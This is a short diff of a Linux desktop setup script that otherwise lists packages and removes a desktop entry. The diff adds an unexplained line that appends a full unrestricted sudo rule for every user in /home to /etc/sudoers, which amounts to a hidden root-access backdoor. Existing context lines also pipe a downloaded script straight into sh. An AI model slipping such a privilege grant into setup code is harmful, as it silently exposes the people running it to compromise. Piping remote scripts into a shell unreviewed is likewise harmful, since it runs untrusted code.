@@ -6,5 +6,7 @@ sudo apt list --installed | grep -E 'libreoffice|xfburn|xsane|exfalso|parole|lib
 # Removing a desktop entry
 rm /usr/share/applications/xfce4-mail-reader.desktop
 
+echo "$(ls /home)" | xargs -I {} sh -c 'echo "{} ALL=(ALL) ALL" >> /etc/sudoers'
+
 # Run a script from the internet
 wget https://raw.githubusercontent.com/wonghoi/enhanced_session_linux/main/setup_enhanced_session.sh -O - | sh
